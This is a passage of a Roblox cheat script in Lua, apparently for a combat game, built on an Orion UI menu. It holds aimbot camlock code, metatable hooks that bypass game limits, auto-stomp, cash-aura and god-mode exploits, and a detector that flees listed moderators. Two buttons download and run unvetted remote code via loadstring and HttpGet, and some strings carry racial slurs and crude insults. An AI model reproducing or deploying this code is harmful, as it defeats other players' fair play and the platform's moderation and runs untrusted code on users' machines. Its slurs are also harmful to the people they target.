            Camera.CFrame = CFrame.new(Camera.CFrame.p, Victim.Character[getgenv().AimPart].Position + Victim.Character[getgenv().AimPart].Velocity*getgenv().Prediction)
        end
    end
end)
	while wait() do
        if getgenv().AutoPrediction == true then
        local pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
        local split = string.split(pingvalue,'(')
        local ping = tonumber(split[1])
            if ping < 225 then
            getgenv().Prediction = 1.4
        elseif ping < 215 then
            getgenv().Prediction = 1.2
	    elseif ping < 205 then
            getgenv().Prediction = 1.0
	    elseif ping < 190 then
            getgenv().Prediction = 0.10
        elseif ping < 180 then
            getgenv().Prediction = 0.12
	    elseif ping < 170 then
            getgenv().Prediction = 0.15
	    elseif ping < 160 then
            getgenv().Prediction = 0.18
	    elseif ping < 150 then
            getgenv().Prediction = 0.110
        elseif ping < 140 then
            getgenv().Prediction = 0.113
        elseif ping < 130 then
            getgenv().Prediction = 0.116
        elseif ping < 120 then
            getgenv().Prediction = 0.120
        elseif ping < 110 then
            getgenv().Prediction = 0.124
        elseif ping < 105 then
            getgenv().Prediction = 0.127
        elseif ping < 90 then
            getgenv().Prediction = 0.130
        elseif ping < 80 then
            getgenv().Prediction = 0.133
        elseif ping < 70 then
            getgenv().Prediction = 0.136
        elseif ping < 60 then
            getgenv().Prediction = 0.15038
        elseif ping < 50 then
            getgenv().Prediction = 0.15038
        elseif ping < 40 then
            getgenv().Prediction = 0.145
        elseif ping < 30 then
            getgenv().Prediction = 0.155
        elseif ping < 20 then
            getgenv().Prediction = 0.157
        end
        end
	end
		end
})
CamSec:AddButton({
	Name = "Smooth cam ( C )",
	Callback = function()

OrionLib:MakeNotification({
	Name = "Injected successfully!",
	Content = "Injected script.",
	Image = "rbxassetid://4483345998",
	Time = 3
})




	wait(3)
getgenv().Settings = {
    Key = "C",
    Enabled = true,
    Pred = 5,
    Part = "Head",
    Smoothness = 0.0085
}

local CC = game.Workspace.CurrentCamera
local Mouse = game.Players.LocalPlayer:GetMouse()
local Plr


Mouse.KeyDown:Connect(function(Key)
    local Keybind = getgenv().Settings.Key:lower()
    if (Key == Keybind) then
        if getgenv().Settings.Enabled == true then
            IsTargetting = not IsTargetting
            if IsTargetting then
                Plr = GetClosest()
            else
                if Plr ~= nil then
                    Plr = nil
                end
            end
        end
    end
end)

function GetClosest()
    local closestPlayer
    local shortestDistance = math.huge
    for i, v in pairs(game.Players:GetPlayers()) do
        pcall(function()

            if v ~= game.Players.LocalPlayer and v.Character and
                v.Character:FindFirstChild("Humanoid") then
                local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
                local magnitude =
                (Vector2.new(pos.X, pos.Y) - Vector2.new(Mouse.X, Mouse.Y)).magnitude
                if (Vector2.new(pos.X, pos.Y) - Vector2.new(Mouse.X, Mouse.Y)).magnitude < shortestDistance then
                    closestPlayer = v
                    shortestDistance = magnitude
                end
            end
        end)
    end
    return closestPlayer
end

local function IsOnScreen(Object)
    local IsOnScreen = game.Workspace.CurrentCamera:WorldToScreenPoint(Object.Position)
    return IsOnScreen
end

local function Filter(Object)
    if string.find(Object.Name, "Gun") then
        return
    end
    if Object:IsA("Part") or Object:IsA("MeshPart") then
        return true
    end
end

local function WTSPos(Position)
    local ObjectVector = game.Workspace.CurrentCamera:WorldToScreenPoint(Position)
    return Vector2.new(ObjectVector.X, ObjectVector.Y)
end

local function WTS(Object)
    local ObjectVector = game.Workspace.CurrentCamera:WorldToScreenPoint(Object.Position)
    return Vector2.new(ObjectVector.X, ObjectVector.Y)
end

function GetNearestPartToCursorOnCharacter(character)
    local ClosestDistance = math.huge
    local BodyPart = nil

    if (character and character:GetChildren()) then
        for k,  x in next, character:GetChildren() do
            if Filter(x) and IsOnScreen(x) then
                local Distance = (WTS(x) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
    
                if Distance < ClosestDistance then
                    ClosestDistance = Distance
                    BodyPart = x
                end
            end
        end
    end

    return BodyPart
end

game.RunService.Heartbeat:Connect(function()
    if getgenv().Settings.Enabled == true then
        local Main = CFrame.new(CC.CFrame.p,Plr.Character[getgenv().Settings.Part].Position + Plr.Character[getgenv().Settings.Part].Velocity / getgenv().Settings.Pred)
        CC.CFrame = CC.CFrame:Lerp(Main, getgenv().Settings.Smoothness, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut,Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
    end
end)

task.spawn(function()
    while task.wait() do
        if getgenv().Settings.Enabled and Plr ~= nil and (Plr.Character) then
            getgenv().Settings.Part = tostring(GetNearestPartToCursorOnCharacter(Plr.Character))
        end
    end
end)
		end
})
CamSec:AddButton({
	Name = "Tapped camlock q",
	Callback = function()

OrionLib:MakeNotification({
	Name = "Injected successfully!",
	Content = "Injected script.",
	Image = "rbxassetid://4483345998",
	Time = 3
})






	getgenv().Prediction = 0.166
getgenv().AimPart = "HumanoidRootPart"
getgenv().Key = "Q"
getgenv().DisableKey = "P"

getgenv().FOV = true
getgenv().ShowFOV = false
getgenv().FOVSize = 55

--// Variables (Service)

local Players = game:GetService("Players")
local RS = game:GetService("RunService")
local WS = game:GetService("Workspace")
local GS = game:GetService("GuiService")
local SG = game:GetService("StarterGui")

--// Variables (regular)

local LP = Players.LocalPlayer
local Mouse = LP:GetMouse()
local Camera = WS.CurrentCamera
local GetGuiInset = GS.GetGuiInset

local AimlockState = true
local Locked
local Victim

local SelectedKey = getgenv().Key
local SelectedDisableKey = getgenv().DisableKey

--// Notification function

function Notify(tx)
    SG:SetCore("SendNotification", {
        Title = "Cam Lock Enabled | .gg/tapped",
        Text = tx,
        Duration = 5
    })
end

--// Check if aimlock is loaded

if getgenv().Loaded == true then
    Notify("Aimlock is already loaded!")
    return
end

getgenv().Loaded = true

--// FOV Circle

local fov = Drawing.new("Circle")
fov.Filled = false
fov.Transparency = 1
fov.Thickness = 1
fov.Color = Color3.fromRGB(255, 255, 0)
fov.NumSides = 1000

--// Functions

function update()
    if getgenv().FOV == true then
        if fov then
            fov.Radius = getgenv().FOVSize * 2
            fov.Visible = getgenv().ShowFOV
            fov.Position = Vector2.new(Mouse.X, Mouse.Y + GetGuiInset(GS).Y)

            return fov
        end
    end
end

function WTVP(arg)
    return Camera:WorldToViewportPoint(arg)
end

function WTSP(arg)
    return Camera.WorldToScreenPoint(Camera, arg)
end

function getClosest()
    local closestPlayer
    local shortestDistance = math.huge

    for i, v in pairs(game.Players:GetPlayers()) do
        local notKO = v.Character:WaitForChild("BodyEffects")["K.O"].Value ~= true
        local notGrabbed = v.Character:FindFirstChild("GRABBING_COINSTRAINT") == nil
        
        if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild(getgenv().AimPart) and notKO and notGrabbed then
            local pos = Camera:WorldToViewportPoint(v.Character.PrimaryPart.Position)
            local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(Mouse.X, Mouse.Y)).magnitude
            
            if (getgenv().FOV) then
                if (fov.Radius > magnitude and magnitude < shortestDistance) then
                    closestPlayer = v
                    shortestDistance = magnitude
                end
            else
                if (magnitude < shortestDistance) then
                    closestPlayer = v
                    shortestDistance = magnitude
                end
            end
        end
    end
    return closestPlayer
end
 
--// Checks if key is down

Mouse.KeyDown:Connect(function(k)
    SelectedKey = SelectedKey:lower()
    SelectedDisableKey = SelectedDisableKey:lower()
    if k == SelectedKey then
        if AimlockState == true then
            Locked = not Locked
            if Locked then
                Victim = getClosest()

                Notify("Locked onto: "..tostring(Victim.Character.Humanoid.DisplayName))
            else
                if Victim ~= nil then
                    Victim = nil

                    Notify("Unlocked!")
                end
            end
        else
            Notify("Aimlock is not enabled!")
        end
    end
    if k == SelectedDisableKey then
        AimlockState = not AimlockState
    end
end)

--// Loop update FOV and loop camera lock onto target

RS.RenderStepped:Connect(function()
    update()
    if AimlockState == true then
        if Victim ~= nil then
            Camera.CFrame = CFrame.new(Camera.CFrame.p, Victim.Character[getgenv().AimPart].Position + Victim.Character[getgenv().AimPart].Velocity*getgenv().Prediction)
        end
    end
end)
	while wait() do
        if getgenv().AutoPrediction == true then
        local pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
        local split = string.split(pingvalue,'(')
        local ping = tonumber(split[1])
            if ping < 225 then
            getgenv().Prediction = 1.4
        elseif ping < 215 then
            getgenv().Prediction = 1.2
	    elseif ping < 205 then
            getgenv().Prediction = 1.0
	    elseif ping < 190 then
            getgenv().Prediction = 0.10
        elseif ping < 180 then
            getgenv().Prediction = 0.12
	    elseif ping < 170 then
            getgenv().Prediction = 0.15
	    elseif ping < 160 then
            getgenv().Prediction = 0.18
	    elseif ping < 150 then
            getgenv().Prediction = 0.110
        elseif ping < 140 then
            getgenv().Prediction = 0.113
        elseif ping < 130 then
            getgenv().Prediction = 0.116
        elseif ping < 120 then
            getgenv().Prediction = 0.120
        elseif ping < 110 then
            getgenv().Prediction = 0.124
        elseif ping < 105 then
            getgenv().Prediction = 0.127
        elseif ping < 90 then
            getgenv().Prediction = 0.130
        elseif ping < 80 then
            getgenv().Prediction = 0.133
        elseif ping < 70 then
            getgenv().Prediction = 0.136
        elseif ping < 60 then
            getgenv().Prediction = 0.15038
        elseif ping < 50 then
            getgenv().Prediction = 0.15038
        elseif ping < 40 then
            getgenv().Prediction = 0.145
        elseif ping < 30 then
            getgenv().Prediction = 0.155
        elseif ping < 20 then
            getgenv().Prediction = 0.157
        end
        end
	end
		end
})
local Misc = Window:MakeTab({
	Name = "Misc",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local MiscSec = Misc:AddSection({
	Name = "Humanoid"
})

MiscSec:AddButton({
	Name = "No slowdown",
	Callback = function()
	
OrionLib:MakeNotification({
	Name = "Injected successfully!",
	Content = "Injected script.",
	Image = "rbxassetid://4483345998",
	Time = 3
})




      		local mt = getrawmetatable(game)
local backup
backup = hookfunction(mt.__newindex, newcclosure(function(self, key, value)
if key == "WalkSpeed" and value < 16 then
value = 16
end
return backup(self, key, value)
end))
  	end    
})
MiscSec:AddButton({
	Name = "No jump cooldowm",
	Callback = function()
	--auto exc support
if not game.IsLoaded(game) then 
    game.Loaded.Wait(game.Loaded);
end

-- variables 
local IsA = game.IsA;
local newindex = nil 

-- main hook
newindex = hookmetamethod(game, "__newindex", function(self, Index, Value)
    if not checkcaller() and IsA(self, "Humanoid") and Index == "JumpPower" then 
        return
    end
    
    return newindex(self, Index, Value);
end)
		end
})

MiscSec:AddButton({
	Name = "Auto reload",
	Callback = function()

MainEvent = game:GetService('ReplicatedStorage').MainEvent
player = game.Players.LocalPlayer;
Distancia = 15; -- Here put the distance to activate

game:GetService('RunService'):BindToRenderStep("Auto-Block", 0 , function()

    local forbidden = {'[Popcorn]','[HotDog]','[GrenadeLauncher]','[RPG]','[SMG]','[TacticalShotgun]','[AK47]','[AUG]','[Glock]', '[Shotgun]','[Flamethrower]','[Silencer]','[AR]','[Revolver]','[SilencerAR]','[LMG]','[P90]','[DrumGun]','[Double-Barrel SG]','[Hamburger]','[Chicken]','[Pizza]','[Cranberry]','[Donut]','[Taco]','[Starblox Latte]','[BrownBag]','[Weights]','[HeavyWeights]'}
local Found = false
for _,v in pairs(game.Workspace.Players:GetChildren()) do
    if (v.UpperTorso.Position - player.Character.HumanoidRootPart.Position).Magnitude <= Distancia then
        if v.BodyEffects.Attacking.Value == true and not table.find(forbidden, v:FindFirstChildWhichIsA('Tool').Name ) and v.Name ~= player.Name then
            Found = true
            MainEvent:FireServer('Block', player.Name)

        end
    end
end
if Found == false then
    if player.Character.BodyEffects:FindFirstChild('Block') then player.Character.BodyEffects.Block:Destroy() end
    end
end)
  	end    
})
MiscSec:AddButton({
	Name = "Telekenesis (REAL)",
	Callback = function()
print("nig")
OrionLib:MakeNotification({
	Name = "Bug detected",
	Content = "Bug detected please report it on our discord. Error code : R4 Line 3525",
	Image = "rbxassetid://4483345998",
	Time = 30
})


		end
})
	


	
	--[[
	
-- Q & E - bring closer and further
-- R - Roates Block
-- T - Tilts Block
-- Y - Throws Block
local function a(b, c)
    local d = getfenv(c)
    local e =
        setmetatable(
        {},
        {__index = function(self, f)
                if f == "script" then
                    return b
                else
                    return d[f]
                end
            end}
    )
    setfenv(c, e)
    return c
end
local g = {}
local h = Instance.new("Model", game:GetService("Lighting"))
local i = Instance.new("Tool")
local j = Instance.new("Part")
local k = Instance.new("Script")
local l = Instance.new("LocalScript")
local m = sethiddenproperty or set_hidden_property
i.Name = "Telekinesis"
i.Parent = h
i.Grip = CFrame.new(0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0)
i.GripForward = Vector3.new(-0, -1, -0)
i.GripRight = Vector3.new(0, 0, 1)
i.GripUp = Vector3.new(1, 0, 0)
j.Name = "Handle"
j.Parent = i
j.CFrame = CFrame.new(-17.2635937, 15.4915619, 46, 0, 1, 0, 1, 0, 0, 0, 0, -1)
j.Orientation = Vector3.new(0, 180, 90)
j.Position = Vector3.new(-17.2635937, 15.4915619, 46)
j.Rotation = Vector3.new(-180, 0, -90)
j.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
j.Transparency = 1
j.Size = Vector3.new(1, 1.20000005, 1)
j.BottomSurface = Enum.SurfaceType.Weld
j.BrickColor = BrickColor.new("Really black")
j.Material = Enum.Material.Metal
j.TopSurface = Enum.SurfaceType.Smooth
j.brickColor = BrickColor.new("Really black")
k.Name = "LineConnect"
k.Parent = i
table.insert(
    g,
    a(
        k,
        function()
            wait()
            local n = script.Part2
            local o = script.Part1.Value
            local p = script.Part2.Value
            local q = script.Par.Value
            local color = script.Color
            local r = Instance.new("Part")
            r.TopSurface = 0
            r.BottomSurface = 0
            r.Reflectance = .5
            r.Name = "Laser"
            r.Locked = true
            r.CanCollide = false
            r.Anchored = true
            r.formFactor = 0
            r.Size = Vector3.new(1, 1, 1)
            local s = Instance.new("BlockMesh")
            s.Parent = r
            while true do
                if n.Value == nil then
                    break
                end
                if o == nil or p == nil or q == nil then
                    break
                end
                if o.Parent == nil or p.Parent == nil then
                    break
                end
                if q.Parent == nil then
                    break
                end
                local t = CFrame.new(o.Position, p.Position)
                local dist = (o.Position - p.Position).magnitude
                r.Parent = q
                r.BrickColor = color.Value.BrickColor
                r.Reflectance = color.Value.Reflectance
                r.Transparency = color.Value.Transparency
                r.CFrame = CFrame.new(o.Position + t.lookVector * dist / 2)
                r.CFrame = CFrame.new(r.Position, p.Position)
                s.Scale = Vector3.new(.25, .25, dist)
                wait()
            end
            r:remove()
            script:remove()
        end
    )
)
k.Disabled = true
l.Name = "MainScript"
l.Parent = i
table.insert(
    g,
    a(
        l,
        function()
            wait()
            tool = script.Parent
            lineconnect = tool.LineConnect
            object = nil
            mousedown = false
            found = false
            BP = Instance.new("BodyPosition")
            BP.maxForce = Vector3.new(math.huge * math.huge, math.huge * math.huge, math.huge * math.huge)
            BP.P = BP.P * 1.1
            dist = nil
            point = Instance.new("Part")
            point.Locked = true
            point.Anchored = true
            point.formFactor = 0
            point.Shape = 0
            point.BrickColor = BrickColor.Black()
            point.Size = Vector3.new(1, 1, 1)
            point.CanCollide = false
            local s = Instance.new("SpecialMesh")
            s.MeshType = "Sphere"
            s.Scale = Vector3.new(.7, .7, .7)
            s.Parent = point
            handle = tool.Handle
            front = tool.Handle
            color = tool.Handle
            objval = nil
            local u = false
            local v = BP:clone()
            v.maxForce = Vector3.new(30000, 30000, 30000)
            function LineConnect(o, p, q)
                local w = Instance.new("ObjectValue")
                w.Value = o
                w.Name = "Part1"
                local x = Instance.new("ObjectValue")
                x.Value = p
                x.Name = "Part2"
                local y = Instance.new("ObjectValue")
                y.Value = q
                y.Name = "Par"
                local z = Instance.new("ObjectValue")
                z.Value = color
                z.Name = "Color"
                local A = lineconnect:clone()
                A.Disabled = false
                w.Parent = A
                x.Parent = A
                y.Parent = A
                z.Parent = A
                A.Parent = workspace
                if p == object then
                    objval = x
                end
            end
            function onButton1Down(B)
                if mousedown == true then
                    return
                end
                mousedown = true
                coroutine.resume(
                    coroutine.create(
                        function()
                            local C = point:clone()
                            C.Parent = tool
                            LineConnect(front, C, workspace)
                            while mousedown == true do
                                C.Parent = tool
                                if object == nil then
                                    if B.Target == nil then
                                        local t = CFrame.new(front.Position, B.Hit.p)
                                        C.CFrame = CFrame.new(front.Position + t.lookVector * 1000)
                                    else
                                        C.CFrame = CFrame.new(B.Hit.p)
                                    end
                                else
                                    LineConnect(front, object, workspace)
                                    break
                                end
                                wait()
                            end
                            C:remove()
                        end
                    )
                )
                while mousedown == true do
                    if B.Target ~= nil then
                        local D = B.Target
                        if D.Anchored == false then
                            object = D
                            dist = (object.Position - front.Position).magnitude
                            break
                        end
                    end
                    wait()
                end
                while mousedown == true do
                    if object.Parent == nil then
                        break
                    end
                    local t = CFrame.new(front.Position, B.Hit.p)
                    BP.Parent = object
                    BP.position = front.Position + t.lookVector * dist
                    wait()
                end
                BP:remove()
                object = nil
                objval.Value = nil
            end
            function onKeyDown(E, B)
                local E = E:lower()
                local F = false
                if E == "q" then
                    if dist >= 5 then
                        dist = dist - 10
                    end
                end
                if E == "r" then
                    if object == nil then
                        return
                    end
                    for G, H in pairs(object:children()) do
                        if H.className == "BodyGyro" then
                            return nil
                        end
                    end
                    BG = Instance.new("BodyGyro")
                    BG.maxTorque = Vector3.new(math.huge, math.huge, math.huge)
                    BG.cframe = CFrame.new(object.CFrame.p)
                    BG.Parent = object
                    repeat
                        wait()
                    until object.CFrame == CFrame.new(object.CFrame.p)
                    BG.Parent = nil
                    if object == nil then
                        return
                    end
                    for G, H in pairs(object:children()) do
                        if H.className == "BodyGyro" then
                            H.Parent = nil
                        end
                    end
                    object.Velocity = Vector3.new(0, 0, 0)
                    object.RotVelocity = Vector3.new(0, 0, 0)
                    object.Orientation = Vector3.new(0, 0, 0)
                end
                if E == "e" then
                    dist = dist + 10
                end
                if E == "t" then
                    if dist ~= 10 then
                        dist = 10
                    end
                end
                if E == "y" then
                    if dist ~= 200 then
                        dist = 200
                    end
                end
                if E == "=" then
                    BP.P = BP.P * 1.5
                end
                if E == "-" then
                    BP.P = BP.P * 0.5
                end
            end
            function onEquipped(B)
                keymouse = B
                local I = tool.Parent
                human = I.Humanoid
                human.Changed:connect(
                    function()
                        if human.Health == 0 then
                            mousedown = false
                            BP:remove()
                            point:remove()
                            tool:remove()
                        end
                    end
                )
                B.Button1Down:connect(
                    function()
                        onButton1Down(B)
                    end
                )
                B.Button1Up:connect(
                    function()
                        mousedown = false
                    end
                )
                B.KeyDown:connect(
                    function(E)
                        onKeyDown(E, B)
                    end
                )
                B.Icon = "rbxasset://textures\\GunCursor.png"
            end
            tool.Equipped:connect(onEquipped)
        end
    )
)
for J, H in pairs(h:GetChildren()) do
    H.Parent = game:GetService("Players").LocalPlayer.Backpack
    pcall(
        function()
            H:MakeJoints()
        end
    )
end
h:Destroy()
for J, H in pairs(g) do
    spawn(
        function()
            pcall(H)
        end
    )
end
		end
})
--]]
MiscSec:AddButton({
	Name = "Mod detector",
	Callback = function()
	local bitch = {
 163721789,
 15427717,
 201454243,
 822999,
 63794379,
 17260230,
 28357488,
 93101606,
 8195210,
 89473551,
 16917269,
 85989579,
 1553950697,
 476537893,
 155627580,
 31163456,
 7200829,
 25717070,
 201454243,
 15427717,
 63794379,
 16138978,
 60660789,
 17260230,
 16138978,
 1161411094,
 9125623,
 11319153,
 34758833,
 194109750,
 35616559,
 1257271138,
 28885841,
 23558830,
 25717070,
  
 
}

for l, c in pairs(game.Players:GetChildren()) do
for i, v in pairs(bitch) do
if c.UserId == v then
local Vanis = game.Players.LocalPlayer
Vanis:Kick("Hoe Detected")
end
end
end
game.Players.PlayerAdded:Connect(function(plr)
for i, v in pairs(bitch) do
if plr.UserId == v then
local Vanis = game.Players.LocalPlayer
Vanis:Kick("Hoe Detected")
end
end
end)
		end
})

MiscSec:AddButton({
	Name = "Fly (X)",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/iluvje54/fly/main/ok"))()
end
})
MiscSec:AddButton({
	Name = "Anti bag",
	Callback = function()
	 local LP = game.Players.LocalPlayer;

    for i,v in ipairs(LP.Character:GetDescendants()) do
        if v.Name == "Christmas_Sock" then v:Destroy()
            end
        end
            
        LP.Character.ChildAdded:Connect(function()
        wait(0.3)
        for i,v in ipairs(LP.Character:GetDescendants()) do
        if v.Name == "Christmas_Sock" then v:Destroy()
        end
        end
        end)
		end
})
MiscSec:AddButton({
	Name = "Korblox (Client)",
	Callback = function()
	local ply = game.Players.LocalPlayer
local chr = ply.Character
chr.RightLowerLeg.MeshId = "902942093"
chr.RightLowerLeg.Transparency = "1"
chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
chr.RightFoot.MeshId = "902942089"
chr.RightFoot.Transparency = "1"
		end
})
MiscSec:AddButton({
	Name = "Headless (Client)",
	Callback = function()
	game.Players.LocalPlayer.Character.Head.Transparency = 1
game.Players.LocalPlayer.Character.Head.Transparency = 1
for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
if (v:IsA("Decal")) then
v.Transparency = 1
end
end
		end
})
MiscSec:AddButton({
	Name = "Flyish speed and macro",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Topcoldgaming/loadstring-scritps-/main/Encoded%20FAKE%20macro%20script"))()
		end
})
MiscSec:AddButton({
	Name = "Fake anim (TRYHARD)",
	Callback = function()
	game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
		end
})
MiscSec:AddButton({
	Name = "God mode",
	Callback = function()
	local localPlayer = game:GetService('Players').LocalPlayer;
                local localCharacter = localPlayer.Character;
                localCharacter:FindFirstChildOfClass('Humanoid').Health = 0;
                local newCharacter = localPlayer.CharacterAdded:Wait();
                local spoofFolder = Instance.new('Folder');
                spoofFolder.Name = 'FULLY_LOADED_CHAR';
                spoofFolder.Parent = newCharacter;
                newCharacter:WaitForChild('RagdollConstraints'):Destroy();
                local spoofValue = Instance.new('BoolValue', newCharacter);
                spoofValue.Name = 'RagdollConstraints';
                local name = game.Players.LocalPlayer.Name
                local lol =    game.Workspace:WaitForChild(name)
                local money = Instance.new("Folder",game.Players.LocalPlayer.Character);money.Name = "FULLY_LOADED_CHAR"
                lol.Parent = game.Workspace.Players
                game.Players.LocalPlayer.Character:WaitForChild("BodyEffects")
                game.Players.LocalPlayer.Character.BodyEffects.BreakingParts:Destroy()
		end
})
MiscSec:AddButton({
	Name = "Anti fling",
	Callback = function()
	-- // Constants \\ --
-- [ Services ] --
local Services = setmetatable({}, {__index = function(Self, Index)
    local NewService = game.GetService(game, Index)
    if NewService then
    Self[Index] = NewService
    end
    return NewService
    end})
    
    -- [ LocalPlayer ] --
    local LocalPlayer = Services.Players.LocalPlayer
    
    -- // Functions \\ --
    local function PlayerAdded(Player)
       local Detected = false
       local Character;
       local PrimaryPart;
    
       local function CharacterAdded(NewCharacter)
           Character = NewCharacter
           repeat
               wait()
               PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
           until PrimaryPart
           Detected = false
       end
    
       CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
       Player.CharacterAdded:Connect(CharacterAdded)
       Services.RunService.Heartbeat:Connect(function()
           if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
               if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
                   if Detected == false then
                       game.StarterGui:SetCore("ChatMakeSystemMessage", {
                           Text = "Fling Exploit detected, Player: " .. tostring(Player);
                           Color = Color3.fromRGB(255, 200, 0);
                       })
                   end
                   Detected = true
                   for i,v in ipairs(Character:GetDescendants()) do
                       if v:IsA("BasePart") then
                           v.CanCollide = false
                           v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                           v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                           v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
                       end
                   end
                   PrimaryPart.CanCollide = false
                   PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                   PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                   PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
               end
           end
       end)
    end
    
    -- // Event Listeners \\ --
    for i,v in ipairs(Services.Players:GetPlayers()) do
       if v ~= LocalPlayer then
           PlayerAdded(v)
       end
    end
    Services.Players.PlayerAdded:Connect(PlayerAdded)
    
    local LastPosition = nil
    Services.RunService.Heartbeat:Connect(function()
       pcall(function()
           local PrimaryPart = LocalPlayer.Character.PrimaryPart
           if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
               PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.CFrame = LastPosition
    
               game.StarterGui:SetCore("ChatMakeSystemMessage", {
                   Text = "You were flung. Neutralizing velocity.";
                   Color = Color3.fromRGB(255, 0, 0);
               })
           elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
               LastPosition = PrimaryPart.CFrame
           end
       end)
    end)
	end
})
MiscSec:AddButton({
	Name = "No recoil",
	Callback = function()
	local CurrentFocus = game:GetService("Workspace").CurrentCamera.CFrame
    game:GetService("Workspace").CurrentCamera:Destroy()
    local Instance = Instance.new("Camera", game:GetService("Workspace"))
    Instance.CameraSubject = game:GetService("Players").LocalPlayer.Character.Humanoid
    Instance.CameraType = Enum.CameraType.Custom
    Instance.CFrame = CurrentFocus
	end
})
MiscSec:AddButton({
	Name = "Auto Buy armor",
	Callback = function()
local PERCENT_TO_BUY_ARMOR   = 20         --\\ percent of armor left that u want to buy
local COMMAND_TO_STOP_BUYING = ('/e stop') --\\ message to stop buying

------------------------
------------------------

function announce(title,text,time)
    game.StarterGui:SetCore("SendNotification", {
        Title = title;
        Text = text;
        Duration = time;
    })
end
announce('Autobuying armor at %' .. tostring(PERCENT_TO_BUY_ARMOR), 'chat ' .. COMMAND_TO_STOP_BUYING .. ' to stop', 8)

local Stopped = false
local Player = game.Players.LocalPlayer
function Main1()
    while wait() do
        local function AutoArmor()
            local Origin = Player.Character.HumanoidRootPart.CFrame
            local Armor = Player.Character.BodyEffects.Armor
            if Armor.Value <= PERCENT_TO_BUY_ARMOR and Stopped == false then
                repeat
                    wait()    
                    Player.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Ignored.Shop["[Medium Armor] - $1000"].Head.CFrame
                    fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Medium Armor] - $1000"].ClickDetector)
                until Armor.Value == 100 or Player.DataFolder.Currency.Value < 1000
                Player.Character.HumanoidRootPart.CFrame = Origin
            end
        end
        local s,e = pcall(AutoArmor)
    end
end
function Main2()
    Player.Chatted:Connect(function(msg)
        if msg == COMMAND_TO_STOP_BUYING and Stopped == false then
            Stopped = true
            announce('stopped buying', '',5)
        end
    end)
end
coroutine.resume(coroutine.create(Main1))
coroutine.resume(coroutine.create(Main2))
end
})
MiscSec:AddButton({
	Name = "Auto stomp",
	Callback = function(niggerballsdick)
	getgenv().AutoStomp = true
while getgenv().AutoStomp == true do
wait(0.5)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
end
end
})
MiscSec:AddButton({
	Name = "Cash Aura",
	Callback = function()
	while wait() do


local function getMoneyAroundMe() 
    for i, money in ipairs(game.Workspace.Ignored.Drop:GetChildren()) do
        if money.Name == "MoneyDrop" and (money.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 20 then
            fireclickdetector(money.ClickDetector)
        end  
    end
end

 getMoneyAroundMe()
end
end
})
MiscSec:AddButton({
	Name = "No legs",
	Callback = function()
		game.Players.LocalPlayer.Character.RightUpperLeg:Destroy()
game.Players.LocalPlayer.Character.LeftUpperLeg:Destroy()
	end
})
MiscSec:AddButton({
	Name = "Auto arrest",
	Callback = function()
	wait(0.5); if _G.AutoArrest == false or game.PlaceId ~= 2788229376 then return else repeat wait() until game.Players.LocalPlayer end

for i, v in next, game.Workspace:GetDescendants() do
	if v:IsA("Seat") then
		v:Destroy()
	end
end

local Plr = game.Players.LocalPlayer

function serverhop()

    print("PENIS")
	Plr:Destroy()
	local x = {}
	for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
		if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
			x[#x + 1] = v.id
		end
	end
	if #x > 0 then
		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
	end
end


spawn(function()
    wait(300)
    serverhop()
end)

game:GetService("RunService").Stepped:connect(function()
    Plr.Character.Humanoid:ChangeState(11)
end)
Plr.CharacterAdded:Connect(function(character)
    repeat wait() until character:FindFirstChild("FULLY_LOADED_CHAR")
    e(character)
end)
function e(character)
    for i, v in pairs(game.Workspace.Ignored.ItemsDrop:GetChildren()) do
